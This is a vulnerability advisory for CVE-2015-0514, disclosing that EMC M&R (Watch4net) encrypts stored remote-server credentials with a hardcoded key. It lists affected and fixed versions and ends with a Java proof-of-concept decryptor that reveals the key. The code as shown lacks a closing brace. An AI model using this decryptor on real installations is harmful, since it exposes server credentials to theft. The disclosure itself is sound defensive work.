## Abstract

It was discovered that EMC M&R (Watch4net) credentials of remote servers stored in Watch4net are encrypted using a fixed hardcoded password. If an attacker manages to obtain a copy of the encrypted credentials, it is trivial to decrypt them.

## Affected products

EMC reports that the following products are affected by this vulnerability:

* EMC M&R (Watch4Net) versions prior 6.5u1
* EMC ViPR SRM versions prior to 3.6.1

## See also

* [CVE-2015-0514](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-0514)

* [ESA-2015-004](https://support.emc.com/kb/197121): EMC M&R (Watch4Net) Multiple Vulnerabilities (**login required**)

## Fix

EMC released the following updated versions that resolve this vulnerability:

* EMC M&R (Watch4Net) 6.5u1
* EMC ViPR SRM 3.6.1

Registered customers can download upgraded software from support.emc.com at <https://support.emc.com/downloads/34247_ViPR-SRM>.

## Introduction

[EMC M&R](http://www.emc.com/data-center-management/watch4net.htm) (formerly known as Watch4net) enables cross-domain performance monitoring of infrastructure and data center components in real-time - from a single, customizable dashboard.

The Remote-Shell-Collector module from EMC M&R (Watch4net) can push and run executable files on remote hosts to collect performance data from storage environments. Remote-Shell-Collector uses SSH for this purpose.

In order to push and collect monitoring data, accounts are created on the remote servers and credentials of these remote servers are stored in Watch4net. These credentials are encrypted using a fixed hardcoded password. If an attacker manages to obtain a copy of the encrypted credentials, it is trivial to decrypt them.

## Details

Due to insecure use of cryptography the credentials of these remote host can be decrypted using the Java class `com.watch4net.apg.v2.common.config.tools.Utils.process()`.

### Proof of concept

```
import com.watch4net.apg.v2.common.config.tools.Utils;

public class Watch4NetCrypt {
	private static void print(String out) {
		System.out.println(out);
	}

	private static void usage() {
		print("Usage:\t watch4netcrypt [-e] password");
		print("\t watch4netcrypt [-d] encrypted");
		System.exit(1);
	}

	public static void main(String[] args) {
		if (args.length != 2 || !("-e".equals(args[0]) || "-d".equals(args[0]))) {
			usage();
		}
		Boolean encrypt = "-e".equals(args[0]);
		String password = args[1];
		if (password != null) {
			print(Utils.process(password, encrypt, "centralized", null));
		}
}

```
